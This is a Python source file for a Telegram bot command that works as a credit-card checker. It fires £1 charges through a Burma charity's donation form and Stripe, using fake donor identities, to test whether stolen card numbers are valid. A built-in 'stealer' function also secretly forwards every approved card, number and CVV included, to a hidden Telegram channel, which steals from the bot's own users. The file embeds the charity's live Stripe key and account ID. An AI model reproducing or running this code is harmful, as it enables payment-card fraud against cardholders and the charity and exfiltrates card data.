import httpx
import time
import asyncio
import re
from faker import Faker
from urllib.parse import urlencode
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

STEALER_CHANNEL_ID = -1003627495953
fake = Faker()

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

async def hiburma_check(fullcc):
    try:
        num, mm, yy, cvv = fullcc.strip().split('|')
    except:
        return "Error", "Invalid card format"

    async with httpx.AsyncClient(timeout=120, follow_redirects=True) as s:
        headers = {"User-Agent": "Mozilla/5.0"}

        # Step 1 — Get donation form tokens
        try:
            r = await s.get("https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB", timeout=120)
            sig = re.search(r'givewp-route-signature=([a-f0-9]+)', r.text)
            sigid = re.search(r'givewp-route-signature-id=([a-zA-Z0-9_-]+)', r.text)
            sigexp = re.search(r'givewp-route-signature-expiration=([0-9]+)', r.text)
            if not (sig and sigid and sigexp):
                return "Error", "Failed to extract tokens"
        except Exception as e:
            return "Error", f"Connection error: {e}"

        donate_url = (
            f"https://www.hiburma.org/?givewp-route=donate"
            f"&givewp-route-signature={sig.group(1)}"
            f"&givewp-route-signature-id={sigid.group(1)}"
            f"&givewp-route-signature-expiration={sigexp.group(1)}"
        )

        first, last, email = fake.first_name(), fake.last_name(), fake.email()
        donate_data = {
            "amount": "1",
            "currency": "GBP",
            "donationType": "single",
            "formId": "542",
            "gatewayId": "stripe_payment_element",
            "firstName": first,
            "lastName": last,
            "email": email,
            "isEmbed": "true",
            "embedId": "give-form-shortcode-1",
            "locale": "en_GB",
            "gatewayData[stripePaymentMethod]": "card",
            "gatewayData[stripePaymentMethodIsCreditCard]": "true",
            "gatewayData[formId]": "542",
            "gatewayData[stripeKey]": "pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1",
            "gatewayData[stripeConnectedAccountId]": "acct_1REnik2N0Z39Zjtm",
            "originUrl": "https://www.hiburma.org/donate-us/"
        }

        # Step 2 — Create donation and get client_secret
        try:
            r = await s.post(donate_url, data=donate_data, headers=headers, timeout=120)
            js = r.json()
            client_secret = js["data"]["clientSecret"]
            pi_id = client_secret.split("_secret")[0]
        except Exception as e:
            return "Error", f"Failed to get client_secret: {e}"

        # Step 3 — Confirm payment with Stripe
        stripe_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        stripe_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0"
        }
        stripe_data = {
            "return_url": "https://www.hiburma.org/donate-us/",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": num,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[billing_details][name]": f"{first} {last}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": "10080",
            "payment_method_data[payment_user_agent]": "stripe.js/2ee772a1e3; stripe-js-v3/2ee772a1e3; payment-element",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1",
            "client_secret": client_secret,
            "_stripe_account": "acct_1REnik2N0Z39Zjtm"
        }

        try:
            rc = await s.post(stripe_url, headers=stripe_headers, data=urlencode(stripe_data), timeout=120)
            res = rc.json()
            if "error" in res:
                return "Declined ✗", res["error"].get("message", "Declined")
            elif res.get("status") == "succeeded":
                return "Approved ✅", "Payment Succeeded"
            else:
                return res.get("status", "Unknown"), "Check manually"
        except Exception as e:
            return "Error", f"Stripe confirm failed: {e}"

@Client.on_message(filters.command("hb", [".", "/"]))
async def hiburma_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "HiBurma 1£ Charge"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /hb

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /hb cc|mes|ano|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        status, response = await hiburma_check(fullcc)

        getbin = await get_bin_details(cc)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        finalresp = f"""
[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}

[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
[玄] 𝘽𝙖𝙣𝙠 -» {bank}
[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}

[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(Client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
